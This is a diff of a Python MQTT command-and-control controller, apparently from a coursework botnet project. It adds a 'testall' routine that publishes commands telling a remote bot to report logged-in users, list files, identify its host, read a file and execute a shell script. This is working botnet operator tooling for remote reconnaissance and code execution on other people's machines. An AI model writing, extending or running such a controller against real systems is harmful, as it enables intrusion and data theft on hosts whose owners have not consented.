@@ -2,10 +2,6 @@ import time
 import paho.mqtt.client as mqtt
 from consts import *
 
-
-client = mqtt.Client()
-client.connect(BROKER, PORT)
-
 # This runs whenever the bot sends a response back to the 'sensors' topic
 def on_message(client, userdata, msg):
     #accept messages taht go lik this : f"{BOT_ID}_RES:
@@ -27,6 +23,23 @@ if __name__ == '__main__':
             cmd = input("> ")
             if cmd.lower() == "exit":
                 break
+
+            if cmd == "testall":
+                print("Testing all Requirements...")
+                test_suite = [
+                    CMD_ANNOUNCE_BOT,
+                    CMD_WHO_IS_LOGGED_IN,
+                    CMD_LIST_FILES,
+                    CMD_ID_HOST,
+                    CMD_GET_FILE_CONTENT + " testFileToExecute.sh",
+                    "./testFileToExecute.sh"
+                ]
+
+                for test in test_suite:
+                    print(f"[*] Testing: {test}")
+                    client.publish(TOPIC, f"{BOT_ID}:{test}")
+                    time.sleep(1) # Wait for bot response before next test
+                continue
             # Send the command to the broker
             client.publish(TOPIC, f"{BOT_ID}:{cmd}")
             client.publish(TOPIC, cmd)
